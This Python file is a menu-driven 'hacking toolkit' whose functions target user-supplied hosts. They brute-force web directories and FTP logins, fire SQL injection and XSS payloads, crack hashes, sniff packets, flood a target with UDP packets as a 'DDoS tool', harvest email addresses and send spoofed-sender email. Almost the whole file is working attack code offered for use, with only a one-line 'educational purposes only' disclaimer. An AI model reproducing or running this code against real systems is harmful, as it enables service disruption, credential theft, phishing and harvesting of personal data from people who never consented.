import os
import requests
import hashlib
from concurrent.futures import ThreadPoolExecutor
import logging
from scapy.all import sniff, Ether, IP, TCP, send, UDP, Raw
import time
from threading import Thread
import socket
import dns.resolver
import re
import ftplib
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import itertools

# Configure logging
logging.basicConfig(
    filename='hacking_toolkit.log',
    level=logging.INFO,
    format='%(asctime)s - %(message)s'
)

# Helper: Logging and printing utility
def log_and_print(message, log_type="info"):
    print(message)
    if log_type == "info":
        logging.info(message)
    elif log_type == "error":
        logging.error(message)

# ASCII Art Intro
def show_intro():
    os.system('cls' if os.name == 'nt' else 'clear')  # Clear the screen
    ascii_art = r"""
    ███████╗ ██████╗ ██████╗ ███████╗ ██████╗ ████████╗██╗██╗     ██╗  ██╗
    ██╔════╝██╔════╝██╔═══██╗██╔════╝██╔═══██╗╚══██╔══╝██║██║     ██║ ██╔╝
    █████╗  ██║     ██║   ██║█████╗  ██║   ██║   ██║   ██║██║     █████╔╝ 
    ██╔══╝  ██║     ██║   ██║██╔══╝  ██║   ██║   ██║   ██║██║     ██╔═██╗ 
    ██║     ╚██████╗╚██████╔╝███████╗╚██████╔╝   ██║   ██║███████╗██║  ██╗
    ╚═╝      ╚═════╝ ╚═════╝ ╚══════╝ ╚═════╝    ╚═╝   ╚═╝╚══════╝╚═╝  ╚═╝
    """
    print(ascii_art)
    print("Welcome to the All-in-One Hacking Toolkit!")
    print("For educational purposes only. Use responsibly. By Noah Bank V 1.26")
    print("-" * 70)

# Web Directory Brute-Forcing
def web_dir_bruteforce():
    target_url = input("Enter target URL (e.g., http://example.com): ").strip()
    if not target_url.startswith(("http://", "https://")):
        log_and_print("Invalid URL format. Use http:// or https://.", "error")
        return

    wordlist_path = input("Enter path to the wordlist file: ").strip()
    if not os.path.isfile(wordlist_path):
        log_and_print("Invalid wordlist path.", "error")
        return

    threads = int(input("Enter the number of threads to use (default: 10): ") or 10)
    log_and_print(f"\nStarting directory brute-forcing on {target_url} using {threads} threads...\n")

    def check_directory(directory):
        url = f"{target_url}/{directory}"
        try:
            response = requests.get(url, timeout=5)
            if response.status_code == 200:
                log_and_print(f"[+] Found: {url}")
            elif response.status_code == 403:
                log_and_print(f"[-] Forbidden: {url}")
        except requests.RequestException as e:
            logging.error(f"Error checking {url}: {e}")

    try:
        with open(wordlist_path, 'r') as wordlist:
            directories = [line.strip() for line in wordlist]
        with ThreadPoolExecutor(max_workers=threads) as executor:
            executor.map(check_directory, directories)
    except Exception as e:
        log_and_print(f"Error: {e}", "error")

# SQL Injection Testing
def sql_injection():
    target_url = input("Enter target URL (e.g., http://example.com/page?id=1): ").strip()
    if not target_url.startswith(("http://", "https://")):
        log_and_print("Invalid URL format. Use http:// or https://.", "error")
        return

    sql_payloads = ["' OR '1'='1", "'; DROP TABLE users; --", "' OR 1=1--", "' OR 'a'='a"]
    log_and_print("\nTesting for SQL injection vulnerabilities...\n")

    try:
        for payload in sql_payloads:
            test_url = target_url + payload
            response = requests.get(test_url, timeout=5)
            if "error" in response.text.lower() or response.status_code == 200:
                log_and_print(f"[+] Potential vulnerability with payload: {payload}")
            else:
                log_and_print(f"[-] No vulnerability with payload: {payload}")
    except requests.RequestException as e:
        log_and_print(f"Error: {e}", "error")

# Hash Cracking
def hash_cracker():
    hash_to_crack = input("Enter the hash to crack: ").strip()
    hash_type = input("Enter hash type (md5, sha1, sha256): ").strip()
    wordlist_path = input("Enter path to the wordlist file: ").strip()

    if not os.path.isfile(wordlist_path):
        log_and_print("Invalid wordlist path.", "error")
        return

    try:
        with open(wordlist_path, 'r') as wordlist:
            for word in wordlist:
                word = word.strip()
                if hash_type == 'md5':
                    hashed_word = hashlib.md5(word.encode()).hexdigest()
                elif hash_type == 'sha1':
                    hashed_word = hashlib.sha1(word.encode()).hexdigest()
                elif hash_type == 'sha256':
                    hashed_word = hashlib.sha256(word.encode()).hexdigest()
                else:
                    log_and_print("Unsupported hash type.", "error")
                    return

                if hashed_word == hash_to_crack:
                    log_and_print(f"[+] Match found: {word}")
                    return
            log_and_print("[-] No match found in the wordlist.")
    except Exception as e:
        log_and_print(f"Error: {e}", "error")

# Network Traffic Analysis
def network_traffic_analysis():
    def packet_callback(packet):
        try:
            if packet.haslayer(Ether):
                eth = packet[Ether]
                ip = packet[IP] if packet.haslayer(IP) else None
                tcp = packet[TCP] if packet.haslayer(TCP) else None

                log_msg = f"Ether: {eth.src} -> {eth.dst}"
                if ip:
                    log_msg += f", IP: {ip.src} -> {ip.dst}"
                if tcp:
                    log_msg += f", TCP: {tcp.sport} -> {tcp.dport}"

                log_and_print(log_msg)
        except Exception as e:
            logging.error(f"Error processing packet: {e}")

    log_and_print("Listening for packets (Press Ctrl+C to stop)...\n")
    try:
        sniff(prn=packet_callback, store=False)
    except KeyboardInterrupt:
        log_and_print("\nStopping network traffic analysis.")

# DDoS Tool
def ddos():
    target_ip = input("Enter target IP: ").strip()
    target_port = int(input("Enter target port: ") or 80)
    message = input("Enter message to send (default: 'DDoS'): ") or "DDoS"
    threads = int(input("Enter the number of threads (default: 10): ") or 10)

    def send_packet():
        while True:
            try:
                packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=message)
                send(packet, verbose=0)
                log_and_print(f"Packet sent to {target_ip}:{target_port}")
            except Exception as e:
                log_and_print(f"Error sending packet: {e}", "error")

    log_and_print(f"Starting DDoS attack on {target_ip}:{target_port} with {threads} threads...")
    for _ in range(threads):
        Thread(target=send_packet, daemon=True).start()

    log_and_print("Press Ctrl+C to stop the attack.")

# New Tools

# Port Scanning
def port_scan(target):
    print(f"Scanning open ports on {target}...")
    open_ports = []
    for port in range(1, 1025):  # Scan ports from 1 to 1024
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        result = sock.connect_ex((target, port))
        if result == 0:
            open_ports.append(port)
        sock.close()

    log_and_print(f"Open ports on {target}: {open_ports}")

# DNS Lookup
def dns_lookup(domain):
    print(f"Performing DNS lookup for {domain}...")
    try:
        result = dns.resolver.resolve(domain, 'A')
        for ipval in result:
            log_and_print(f"IP Address: {ipval.to_text()}")
    except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN):
        log_and_print("No A record found for this domain.", "error")

# Email Harvesting
def email_harvest(url):
    print(f"Harvesting emails from {url}...")
    try:
        response = requests.get(url)
        emails = re.findall(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}", response.text)
        if emails:
            log_and_print(f"Found emails: {emails}")
        else:
            log_and_print("No emails found on the page.")
    except requests.RequestException as e:
        log_and_print(f"Error: {e}", "error")

# FTP Brute-Forcing
def ftp_bruteforce():
    target = input("Enter the target FTP server (e.g., ftp://example.com): ").strip()
    username_list = input("Enter the path to the username wordlist: ").strip()
    password_list = input("Enter the path to the password wordlist: ").strip()

    try:
        with open(username_list, 'r') as user_file, open(password_list, 'r') as pass_file:
            usernames = [line.strip() for line in user_file.readlines()]
            passwords = [line.strip() for line in pass_file.readlines()]

        for username in usernames:
            for password in passwords:
                try:
                    ftp = ftplib.FTP(target)
                    ftp.login(username, password)
                    log_and_print(f"Success! Username: {username}, Password: {password}")
                    ftp.quit()
                    return
                except ftplib.error_perm:
                    continue
                except Exception as e:
                    log_and_print(f"Error connecting to {target}: {e}")
    except FileNotFoundError:
        log_and_print("Wordlist file not found.", "error")

# SMTP Spoofing
def smtp_spoofing():
    sender_email = input("Enter your email address: ").strip()
    target_email = input("Enter target email address: ").strip()
    smtp_server = input("Enter the SMTP server address (e.g., smtp.gmail.com): ").strip()
    smtp_port = int(input("Enter the SMTP port (default: 587): ").strip() or 587)
    spoofed_sender = input("Enter the spoofed sender email: ").strip()
    password = input("Enter your email password: ").strip()
    subject = input("Enter the email subject: ").strip()
    body = input("Enter the email body: ").strip()

    msg = MIMEMultipart()
    msg['From'] = spoofed_sender
    msg['To'] = target_email
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))

    try:
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(sender_email, password)
        text = msg.as_string()
        server.sendmail(spoofed_sender, target_email, text)
        log_and_print("Email sent successfully!")
        server.quit()
    except Exception as e:
        log_and_print(f"Failed to send email: {e}", "error")

# XSS Testing
def xss_testing():
    target_url = input("Enter the target URL (e.g., http://example.com/page?input=): ").strip()
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src='x' onerror='alert(1)'>",
        "<iframe src='javascript:alert(1)'></iframe>"
    ]
    log_and_print("Testing for XSS vulnerabilities...\n")

    try:
        for payload in payloads:
            test_url = target_url + payload
            response = requests.get(test_url)
            if payload in response.text:
                log_and_print(f"Vulnerable to XSS with payload: {payload}")
            else:
                log_and_print(f"Not vulnerable to XSS with payload: {payload}")
    except requests.RequestException as e:
        log_and_print(f"Error: {e}", "error")

# Main Menu Loop
def main_menu():
    while True:
        show_intro()
        print("""
        1. Web Directory Brute-Forcing
        2. SQL Injection Testing
        3. Hash Cracking
        4. Network Traffic Analysis
        5. DDoS Tool
        6. Port Scan
        7. DNS Lookup
        8. Email Harvesting
        9. FTP Brute-Forcing
        10. SMTP Spoofing
        11. XSS Testing
        12. Exit
        """)
        choice = input("Choose an option: ").strip()

        if choice == '1':
            web_dir_bruteforce()
        elif choice == '2':
            sql_injection()
        elif choice == '3':
            hash_cracker()
        elif choice == '4':
            network_traffic_analysis()
        elif choice == '5':
            ddos()
        elif choice == '6':
            target = input("Enter the target IP to scan: ").strip()
            port_scan(target)
        elif choice == '7':
            domain = input("Enter the domain to look up: ").strip()
            dns_lookup(domain)
        elif choice == '8':
            url = input("Enter the URL to harvest emails from: ").strip()
            email_harvest(url)
        elif choice == '9':
            ftp_bruteforce()
        elif choice == '10':
            smtp_spoofing()
        elif choice == '11':
            xss_testing()
        elif choice == '12':
            log_and_print("Exiting the toolkit...")
            break
        else:
            log_and_print("Invalid choice. Please try again.", "error")

if __name__ == "__main__":
    main_menu()
